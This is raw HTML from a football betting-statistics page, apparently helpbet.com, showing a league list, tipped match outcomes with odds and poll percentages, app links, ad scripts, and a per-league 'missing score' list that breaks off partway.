<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=history_panorama" ><b>Teams home & away</b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=underover_history" ><b>Under-Over</b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=goalgoal_history" ><b>Goal/Goal-No G/G</b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=betdraws_history" ><b>Draws<b></a></td></tr>

<td height=1></td></tr>

<td height=20 valign=top class="pliktra">Statistics</td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=stats&stats=LGS&data=1X2" >Leagues</a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=stats&stats=ODD1&data=1X2" >Home odds</a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=stats&stats=ODD2&data=1X2" >Away odds</a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=my_reality_home" >Reality</a></td></tr>




<td height=5></td></tr>

<td class=mylivescores height=50 align=center><a class=mylivescores href="index.php?page=livescores" title="livescores, livescore" target="_blank">Live Scores</a></td></tr>

<td height=100%>
</td></tr>

<td height=5></td></tr>

<td align=center><a style="color: white" href="http://www.bolanis.gr" title="◊ÂÈÒÔıÒ„ÔÚ" target="_blank"><b>˜ÂÈÒÔıÒ„ÔÚ</b></a></td></tr>
<td align=center><a style="color: white" href="http://www.numbergames.gr" title="ÍÎÁÒ˘ÛÂÈÚ ÍÈÌÔ live" target="_blank"><b>kino live</b></a></td></tr>
<td align=center><a style="color: white" href="http://www.betcosmos.com" title="pame stoixima, ·ÏÂ ÛÙÔÈ˜ÁÏ·" target="_blank"><b>pame stoixima</b></a></td></tr>

</table>

</td>

<td valign=top align=center width=100% height=100% bgcolor=white>
<table border=0 CELLSPACING=0 CELLPADDING=0 width=99% height=100% >

<td width=100% align=center valign=top><div id="ENGAGEYA_WIDGET_117268"></div>

<script data-cfasync="false">

(function(E,n,G,A,g,Y,a){E['EngageyaObject']=g;E[g]=E[g]||function(){
(E[g].q=E[g].q||[]).push(arguments)},E[g].l=1*new
Date();Y=n.createElement(G),
a=n.getElementsByTagName(G)[0];Y.async=1;Y.src=A;a.parentNode.insertBefore(Y,a)})(window,document,'script','//widget.engageya.com/engageya_loader.js','__engWidget');

__engWidget('createWidget',{wwei:'ENGAGEYA_WIDGET_117268',pubid:161214,webid:175613,wid:117268});

</script>
<table width=100% valign=top border=0>
<td width=60% height=100% valign=top>
	<table width=100% valign=top border=0 style="font-family:Calibri; font-size: 12px">

<td valign=top width=100%>
   
<table width=100% border=1 style="border-collapse: collapse" style="font-family:Verdana; font-size: 8pt">
<th class="bara" height="30" style="color: white" colspan=4>Leagues with next matches</th></tr>
<td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=AYP"><br></a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=AR2">ARGENTINA<br>Argentina B</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=ARG">ARGENTINA<br>Argentina</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=AYL">AUSTRALIA<br></a></td></tr><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=AY2">AUSTRIA<br></a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=AY1">AUSTRIA<br>Bundesliga</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=BOY">BULGARIA<br>Premier</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=XIL">CHILE<br></a></td></tr><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=KIN">CHINA<br>Super League</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=KOL">COLOMBIA<br></a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=KRK">COSTA RICA<br>Apertura</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=KRO">CROATIA<br>Division 1</a></td></tr><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=TSX">CZECH<br>Gambrinus Liga</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=DA2">DENMARK<br>Denmark 2nd</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=DAN">DENMARK<br>Superliga</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=AGP">ENGLAND<br>Premier League</a></td></tr><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=AGT">ENGLAND<br>Championship</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=AG1">ENGLAND<br>League One</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=AG2">ENGLAND<br>League Two</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=ANL">ENGLAND<br>Eng. Nat.</a></td></tr><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=ISIM">EQUADOR<br></a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=GA3">FRANCE<br>Ligue 3</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=GA1">FRANCE<br>Ligue 1</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=GA2">FRANCE<br>Ligue 2</a></td></tr><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=GE3">GERMANY<br>3.Liga</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=GE1">GERMANY<br>Bundesliga 1</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=GE2">GERMANY<br>Bundesliga 2</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=EBE">GREECE<br>Football League</a></td></tr><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=OLL">HOLLAND<br>Eredivisie</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=OYG">HUNGARY<br>Division 1</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=IRL">IRELAND<br>Premier League</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=IT1">ITALY<br>Serie A</a></td></tr><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=IT2">ITALY<br>Serie B</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=…¡–2">JAPAN<br>Division 2</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=IAP">JAPAN<br>Division 1</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=KAZ">KAZAKHSTAN<br>Premier</a></td></tr><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=MEX">MEXICO<br>Clausura</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=NO1">NORWAY<br>Tippeligaen</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=PAR">PARAGUAY<br>Apertura</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=POL">POLAND<br>Extraklasa</a></td></tr><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=POL2">POLAND<br>Div2</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=PO2">PORTUGAL<br>Division 2</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=POR">PORTUGAL<br>Superliga</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=ROY">ROMANIA<br>Liga 1</a></td></tr><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=RWS">RUSSIA<br>Premier Division</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=RW2">RUSSIA<br></a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=SCP">SCOTLAND<br>Premier</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=STS">SCOTLAND<br>Championship</a></td></tr><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=SC1">SCOTLAND<br>Division 1</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=SC2">SCOTLAND<br>Division 2</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=NKR">SOUTH KOREA<br>Division 1</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=NK2">SOUTH KOREA<br>Division 2</a></td></tr><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=IS1">SPAIN<br>Primera</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=IS2">SPAIN<br>Segunda</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=EL2">SWITZERLAND<br></a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=ELB">SWITZERLAND<br>Super League</a></td></tr><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=TOY">TURKEY<br>Super League</a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=OYR">URUGUAY<br></a></td><td class=table align=center height=20><a style="color: navy" href="index.php?page=my_league&league=AME">USA<br>MLS</a></td></table>

</td>
</tr>

<td height=3></td>
</tr>

<td align=center valign=top width=100%>

		<table border=5 bgcolor=white bordercolor=red style="border-collapse: collapse">
		<td>
				</td>
		</table>

</td>
</tr>

<td height=3></td>
</tr>

<th height="30" class="bara">Poll 100%</th>
</tr>
<td width=100% valign=top>
<table width=100% style="border-collapse: collapse" style="font-family:Calibri; font-size: 12px">

<tr align=center class='table'><td><a href="index.php?page=my_arena&code=766">Rosario central-Chacarita</a></td>
<td>Home</td>
<td>1.45</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=785">Sydney-Ã–—…”Ã–≈⁄Õ  —œ¡—</a></td>
<td>Home</td>
<td>1.38</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=801">Fulham-Q.p.r</a></td>
<td>Home</td>
<td>1.50</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=803">Lincoln-Grimsby</a></td>
<td>Home</td>
<td>1.58</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=807">Karlsruhe-Sv meppen</a></td>
<td>Home</td>
<td>1.47</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=808">Paderborn-Fsv zwickau</a></td>
<td>Home</td>
<td>1.38</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=809">Unterhaching-Wurzburger kick.</a></td>
<td>Draw</td>
<td>2.95</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=812">Kallithea-Ofi</a></td>
<td>Away</td>
<td>1.35</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=815">Bursaspor-Sivasspor</a></td>
<td>Draw</td>
<td>3.05</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=816">Krasnodar-Fc ufa</a></td>
<td>Home</td>
<td>1.50</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=819">Omonia-A.e.k. larnaca</a></td>
<td>Away</td>
<td>1.75</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=820">Banik†ostrava-Dukla praha</a></td>
<td>Home</td>
<td>1.65</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=823">Reims-Lens</a></td>
<td>Home</td>
<td>1.70</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=833">¡⁄Õ‘—¡◊‘ ÷—¡Õ ÷œ’—‘«”-Mainz</a></td>
<td>Home</td>
<td>1.55</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=838">Rapid vienna-Wolfsberger</a></td>
<td>Home</td>
<td>1.32</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=840">Afc fylde-Hartlepool</a></td>
<td>Home</td>
<td>1.48</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=843">Chester-Aldershot town</a></td>
<td>Away</td>
<td>1.95</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=848">Maidstone utd-Sutton utd</a></td>
<td>Away</td>
<td>2.20</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=858">Plymouth-Bristol rovers</a></td>
<td>Home</td>
<td>2.20</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=862">Barnet-Wycombe</a></td>
<td>Away</td>
<td>2.05</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=864">Carlisle-Crawley town</a></td>
<td>Home</td>
<td>1.85</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=867">Crewe-Coventry</a></td>
<td>Away</td>
<td>2.25</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=870">Port vale-Stevenage</a></td>
<td>Home</td>
<td>2.00</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=878">Wolves-Burton albion</a></td>
<td>Home</td>
<td>1.20</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=885">Forfar athletic-Ayr utd</a></td>
<td>Away</td>
<td>1.38</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=888">Berwick-Stenhousemuir</a></td>
<td>Away</td>
<td>1.81</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=889">Cowdenbeath-Elgin city</a></td>
<td>Away</td>
<td>2.05</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=893">Dundee utd-Inverness</a></td>
<td>Home</td>
<td>1.72</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=897">Aberdeen-Dundee</a></td>
<td>Home</td>
<td>1.40</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=903">Valencia-Alaves</a></td>
<td>Home</td>
<td>1.35</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=918">Rosenborg-Kristiansund</a></td>
<td>Home</td>
<td>1.15</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=923">Sturm graz-Scr altach</a></td>
<td>Home</td>
<td>1.45</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=926">Liverpool-Watford</a></td>
<td>Home</td>
<td>1.12</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=927">Wolfsburg-Schalke 04</a></td>
<td>Away</td>
<td>2.05</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=935">Fc zurich-Young boys</a></td>
<td>Away</td>
<td>1.70</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=938">P.s.v.-Vvv venlo</a></td>
<td>Home</td>
<td>1.14</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=947">New york city fc-Orlando city</a></td>
<td>Home</td>
<td>1.35</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=950">Manchester utd-Brighton</a></td>
<td>Home</td>
<td>1.22</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=952">Spal-Juventus</a></td>
<td>Away</td>
<td>1.25</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=955">San lorenzo-Olimpo bahia blanca</a></td>
<td>Home</td>
<td>1.40</td>
<td>100%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=1113">Incheon united-Daegu</a></td>
<td>Home</td>
<td>2.20</td>
<td>100%</td>
</tr>
</table>
</td>
</tr>

<td height="26" align=center class="baramikri"><a href="index.php?page=my_poll_100" >click here for Poll 100% for the next days</a></td>
</tr>

<td height=5></td>
</tr>

<td height=5></td>
</tr>

<th height="30" class="bara">Poll 70%-99%</th>
</tr>

<td width=100% valign=top>
    <table width=100% style="border-collapse: collapse" style="font-family:Calibri; font-size: 12px">

<tr align=center class='table'><td><a href="index.php?page=my_arena&code=761">Setubal-Portimonense</a></td>
<td>Home</td>
<td>2.20</td>
<td>75%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=767">Deportes temuco-Palestino</a></td>
<td>Home</td>
<td>2.10</td>
<td>71%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=768">Colon santa fe-Lanus</a></td>
<td>Home</td>
<td>1.75</td>
<td>93%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=770">Puebla-Santos laguna</a></td>
<td>Home</td>
<td>2.25</td>
<td>72%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=794">Chongqing lifan-Jiangsu suning</a></td>
<td>Away</td>
<td>2.20</td>
<td>90%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=795">Kaiserslautern-Fc st. pauli</a></td>
<td>Home</td>
<td>2.40</td>
<td>78%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=797">Sandhausen-Bochum</a></td>
<td>Draw</td>
<td>2.85</td>
<td>71%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=821"> ÃÀ¡Õ‘¡ Ã–œÀ≈”À¡¬-Slovacko</a></td>
<td>Home</td>
<td>1.60</td>
<td>83%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=827">Empoli-Venezia</a></td>
<td>Draw</td>
<td>3.25</td>
<td>75%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=829">Novara-Palermo</a></td>
<td>Away</td>
<td>2.30</td>
<td>77%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=830">Perugia-Spezia</a></td>
<td>Home</td>
<td>1.85</td>
<td>87%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=831">Virtus entella-Parma</a></td>
<td>Away</td>
<td>2.10</td>
<td>94%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=836">Lillestrom-Sarpsborg</a></td>
<td>Away</td>
<td>2.40</td>
<td>83%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=845">Eastleigh-Leyton orient</a></td>
<td>Draw</td>
<td>3.10</td>
<td>75%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=846">Guiseley afc-Halifax</a></td>
<td>Away</td>
<td>2.40</td>
<td>71%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=849">”œÀ…◊œ’À Ãœ—”-Torquay</a></td>
<td>Home</td>
<td>1.82</td>
<td>94%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=850">Woking-Wrexham</a></td>
<td>Away</td>
<td>2.20</td>
<td>87%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=853">Gillingham-Blackburn</a></td>
<td>Away</td>
<td>1.58</td>
<td>83%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=856">Oldham-Portsmouth</a></td>
<td>Home</td>
<td>2.45</td>
<td>85%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=857">Oxford-Peterboro</a></td>
<td>Away</td>
<td>2.20</td>
<td>88%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=859">Rochdale-Afc wimbledon</a></td>
<td>Home</td>
<td>1.85</td>
<td>85%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=861">Accrington st-Forest green</a></td>
<td>Home</td>
<td>1.70</td>
<td>71%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=866">Colchester-Yeovil</a></td>
<td>Home</td>
<td>1.75</td>
<td>88%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=869">Newport county-Luton</a></td>
<td>Draw</td>
<td>3.10</td>
<td>75%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=872">Brentford-Middlesbro</a></td>
<td>Away</td>
<td>2.85</td>
<td>77%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=874">Leeds-Sheffield wed</a></td>
<td>Home</td>
<td>1.90</td>
<td>80%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=876">Sheffield utd-Nottm forest</a></td>
<td>Home</td>
<td>1.60</td>
<td>75%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=877">Sunderland-Preston</a></td>
<td>Away</td>
<td>2.05</td>
<td>94%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=879">Bournemouth-West brom</a></td>
<td>Home</td>
<td>1.75</td>
<td>94%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=883">Albion rovers-Arbroath</a></td>
<td>Away</td>
<td>1.67</td>
<td>85%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=884">Alloa athletic-≈—Õ‘—… √…œ’Õ.</a></td>
<td>Home</td>
<td>1.68</td>
<td>77%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=892">Brechin-Dumbarton</a></td>
<td>Away</td>
<td>1.82</td>
<td>71%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=896">Queen of south-St mirren</a></td>
<td>Away</td>
<td>2.20</td>
<td>75%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=898">Rangers-Kilmarnock</a></td>
<td>Home</td>
<td>1.35</td>
<td>71%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=899">Hearts-Partick</a></td>
<td>Home</td>
<td>1.95</td>
<td>88%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=901">Osasuna-Zaragoza</a></td>
<td>Draw</td>
<td>3.00</td>
<td>71%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=913">Argentinos juniors-Newells old boys</a></td>
<td>Home</td>
<td>1.85</td>
<td>92%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=914">Temperley-Huracan</a></td>
<td>Away</td>
<td>2.45</td>
<td>85%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=917">Udinese-Sassuolo</a></td>
<td>Home</td>
<td>2.10</td>
<td>71%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=919">Jagiellonia-Arka gdynia</a></td>
<td>Home</td>
<td>1.57</td>
<td>71%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=921">Lorca fc-Barcelona b</a></td>
<td>Away</td>
<td>2.25</td>
<td>71%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=924">St. polten-Trenk. admira</a></td>
<td>Away</td>
<td>2.60</td>
<td>87%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=925">Bolton-Aston villa</a></td>
<td>Away</td>
<td>1.70</td>
<td>83%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=931">R. sociedad-Getafe</a></td>
<td>Home</td>
<td>1.60</td>
<td>83%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=934">St gallen-Grasshoppers</a></td>
<td>Home</td>
<td>2.15</td>
<td>88%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=936">Feirense-Benfica</a></td>
<td>Away</td>
<td>1.15</td>
<td>87%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=937">San martin-Gimnasia lp</a></td>
<td>Draw</td>
<td>2.80</td>
<td>78%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=940">Sigma†omolouc-Karvina</a></td>
<td>Home</td>
<td>1.60</td>
<td>80%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=942">Montpellier-Dijon</a></td>
<td>Home</td>
<td>1.50</td>
<td>75%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=943">Angers-Caen</a></td>
<td>Home</td>
<td>1.85</td>
<td>71%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=944">Toulouse-Strasbourg</a></td>
<td>Home</td>
<td>1.85</td>
<td>87%</td>
</tr><tr align=center class='table'><td><a href="index.php?page=my_arena&code=954">Fc porto-Boavista</a></td>
<td>Home</td>
<td>1.05</td>
<td>83%</td>
</tr>
</table>
</td>
</tr>



<td height="26" align=center class="baramikri"><a href="index.php?page=my_poll_big" >click here for Poll 70%-99% for the next days</a></td>
</tr>

</table>

	<table align=center width=100% valign=top border=0>

	<td colspan=2>
	<h2> Bet Data Application is available<br>for <b>ALL</b> devices on ios and android</h2>
	</td>
	</tr>

	<td width=50% align=center>
	
	<a href="https://play.google.com/store/apps/details?id=com.talkingdata.apps.android.betdata" target="_blank"><img src="googleplay.jpg" width=200 border=0></a>
	</td>

	<td width=50% align=center>
	<a href="https://itunes.apple.com/WebObjects/MZStore.woa/wa/viewSoftware?id=1015031839&mt=8" target="_blank"><img src="appstore.png" width=200 border=0></a>
	</td>
	</tr>
	
	<td colspan=2>
	<iframe width="560" height="315" src="https://www.youtube.com/embed/8yakk0J6D50" frameborder="0" allowfullscreen></iframe>
	</td>
	</tr>
	</table>

</td>

<td width=40% height=100% valign=top>
	<!-- /52555387/helpbet.com_300x600 -->
<div><script async='async' src='https://www.googletagservices.com/tag/js/gpt.js'></script> <script> var googletag = googletag || {}; googletag.cmd = googletag.cmd || []; </script> <script> googletag.cmd.push(function() { var _YB=_YB||{ab:function(){return (_YB.dool?'b':'a'+Math.floor(Math.random()*10));},dc:function(){return (_YB.dool?'d':'c'+Math.floor(Math.random()*20));},mx:function(){return (!_YB.dool?'x':'m'+Math.floor(Math.random()*180));},tt:function(){return ('tt'+Math.floor(Math.random()*10));},dool:Math.random()>=0.1}; var _yt=new Date(),yb_th=_yt.getUTCHours()-8,yb_tm=_yt.getUTCMinutes(),yb_wd=_yt.getUTCDay();if(yb_th<0){yb_th=24+yb_th;yb_wd-=1;};if(yb_wd<0){yb_wd=7+yb_wd}; googletag.defineSlot('/52555387/helpbet.com_300x600', [300, 600], 'div-gpt-ad-1510751842954-1').setTargeting('yb_ab', _YB.ab()).setTargeting('yb_dc', _YB.dc()).setTargeting('yb_mx', _YB.mx()).setTargeting('yb_tt', _YB.tt()).setTargeting('yb_ff', String(Math.round(Math.random()))).setTargeting('yb_th', yb_th.toString()).setTargeting('yb_tm', yb_tm.toString()).setTargeting('yb_wd', yb_wd.toString()).addService(googletag.pubads()); googletag.enableServices(); }); </script></div>
 <div id='div-gpt-ad-1510751842954-1' style='height:600px; width:300px;'> <script> googletag.cmd.push(function() { googletag.display('div-gpt-ad-1510751842954-1'); }); </script> </div>
<table width=100% valign=top border=0 style="border-collapse: collapse" bgcolor=black>

<td height=1></td>
</tr>

<th height="30" class="bara" colspan=3 style="font-family:Tahoma; font-size: 12px">Statistics on the leagues</th>
</tr>

<td valign=top width=100%>
   <table "class=maintxt" width=100% cellpadding=5 border=0 style="border-collapse: collapse">

<td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>england - Eng.L1</b><br>Score  4-0 is missing on 271 matches<br>Score  5-0 is missing on 406 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>england - Eng.L2</b><br>Score  2-1 is missing on 30 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>england - Eng.Pr</b><br>Score  1-3 is missing on 137 matches<br>Score  3-2 is missing on 190 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>england - Eng.Ch</b><br>Score  2-3 is missing on 139 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>england - Eng. Nat.</b><br>Score  1-2 is missing on 46 matches<br>Score  1-5 is missing on 670 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>usa - USA</b><br>Score  1-0 is missing on 35 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>argentina - Argentina</b><br>Score  1-3 is missing on 128 matches<br>Score  2-5 is missing on 2477 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>austria - Austria Bund</b><br>Score  3-0 is missing on 52 matches<br>Score  4-1 is missing on 121 matches<br>Score  5-2 is missing on 570 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>austria - Red Zac Erste Liga</b><br>Score  2-5 is missing on 822 matches<br>Score  4-0 is missing on 78 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>australia - A-League</b><br>Score  2-4 is missing on 256 matches<br>Score  2-5 is missing on 294 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>france - Ligue 1</b><br>Score  2-3 is missing on 293 matches<br>Score  3-1 is missing on 63 matches<br>Score  4-2 is missing on 417 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#cedce7><b>france - Ligue 2</b><br>Score  1-1 is missing on 26 matches<br></td></tr><td class='maintxt' colspan=2 align=center bgcolor=#e8eef3><b>germany - Bundesliga</b><br>Score  0-3 is missing on 137 matches<br>Score  4-0 is missing on 113 